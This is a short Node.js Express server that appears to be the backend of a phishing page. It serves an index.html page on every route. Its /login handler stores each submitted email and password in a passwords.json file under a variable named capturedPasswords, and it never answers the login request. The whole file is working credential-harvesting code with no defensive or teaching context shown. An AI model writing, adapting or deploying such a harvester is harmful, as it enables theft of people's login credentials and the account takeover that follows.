const fs = require("fs-extra");
const path = require("path");
const express = require('express');
const bodyParser = require('body-parser');
const logger = require('./logger');

const port = 3000;
const passwordsFilePath = path.resolve("passwords.json");

const app = express();

app.use((req, res, next) => {
  logger.info(`${req.method.toUpperCase()} ${req.originalUrl}`);
  next();
});
app.use(bodyParser.urlencoded({ extended: false }));

app.get('/', (req, res) => res.sendFile(path.resolve("index.html")));
app.post('/login', (req, res) => {
  const { email, pass } = req.body;

  let capturedPasswords;
  if (fs.existsSync(passwordsFilePath)) {
    capturedPasswords = fs.readJSONSync(passwordsFilePath);
  } else {
    capturedPasswords = [];
  }

  capturedPasswords.push({
    email,
    pass
  });

  fs.writeJSONSync(passwordsFilePath, capturedPasswords, { spaces: 2 });
});

app.use((req, res) => res.sendFile(path.resolve("index.html")));

app.listen(port, () => logger.info(`App listening on port ${port}!`));